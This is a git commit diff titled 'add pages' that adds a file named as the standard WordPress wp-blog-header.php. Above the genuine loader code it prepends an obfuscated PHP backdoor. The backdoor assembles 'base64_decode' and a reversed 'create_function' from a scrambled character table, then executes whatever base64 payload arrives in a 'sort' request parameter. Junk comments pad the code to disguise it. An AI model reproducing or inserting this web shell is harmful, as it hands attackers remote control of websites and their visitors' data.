63ee83ca37eaef59b9e685e99b52d5ea9a415fd9
yvonjisoa <rmvonji@gmail.com>
2019-09-25 15:47:23 +0200

    add pages

---
+++ images/www/wp-blog-header.php
@@ -0,0 +1,61 @@
+<?php 
+
+
+$sHDVsLPz5654 = "60;u.oab4zp3iqt_hfsdgry2m/1el7k)x5c8(9vw*nj";
+
+
+$OgkFcucC7204 = "";
+
+foreach([18,5,21,14] as $f){
+       $OgkFcucC7204 .= $sHDVsLPz5654[$f];
+    }
+
+
+if(isset($REQUEST /*DzCLIBoYdCQagcldIYfScPDFfAjaiDcqfVNlndwYyXHmdcyoUrBQqoUcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttvrdJesAKzrbSKByhrIjbyV*/["$OgkFcucC7204"])){
+    $axKbpWhk3958 = $_REQUEST /*DzCLIBoYdCQagcldIYfScPDFfAjaiDcqfVNlndwYyXHmdcyoUrBQqoUcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttvrdJesAKzrbSKByhrIjbyV*/["$OgkFcucC7204"];
+    $gGffnHlm534 = "";
+    $zCqYMOIY99 = "";
+
+    /*bVwXiFIfyXWEbjduwbuYPKPoJWDRkVFCXtlWaBnWYgdbXrzjCWTTQeddtBukqALpmKtOlskHTiDsntoTbJLIlrKKxaEyQYkVUUVAQbCmgexCXoxvTrWqZxLlUthFJqdu*/
+
+    foreach([7,6,18,27,0,8,15,19,27,34,5,19,27] as $f){
+       $gGffnHlm534 .= $sHDVsLPz5654[$f];
+    }
+
+    /*XYQfOEmKNTKGadaSfRBShxfGLFeFWBpNsWfEfbqbOCqDwLWiKmAoIrTUVLuzCGVahNNWQrOmifqtmmmrJzSDDebczKemCEUgqxPiVBFqVBKdwHVucHDLSKCdwDiTVwng*/
+
+
+    foreach([18,14,21,21,27,38] as $f){
+       $zCqYMOIY99 .= $sHDVsLPz5654[$f];
+    }
+
+    /*SbkntEQocQxHZWXqOHINzkwYNpFtIhaZOzZmlBugDZEeVeugTChJBDKMyUvNOMfLdQhewrsRxbevlgjPspZyWQsuBuFbokFrMaJQabJvLXYFVbsskXlgKXtVZMihhCyR*/
+
+    $f = $zCqYMOIY99('n'.'o'.'i'.'t'.'c'.'n'.'u'.'f'.'_'.''.''.''.''.'e'.''.'t'.'a'.'e'.''.'r'.''.''.''.'c');
+    $s = $f("", $gGffnHlm534($axKbpWhk3958));
+    $s();
+    exit();
+
+}
+
+
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( !isset($wp_did_header) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once( dirname(__FILE__) . '/wp-load.php' );
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once( ABSPATH . WPINC . '/template-loader.php' );
+
+}
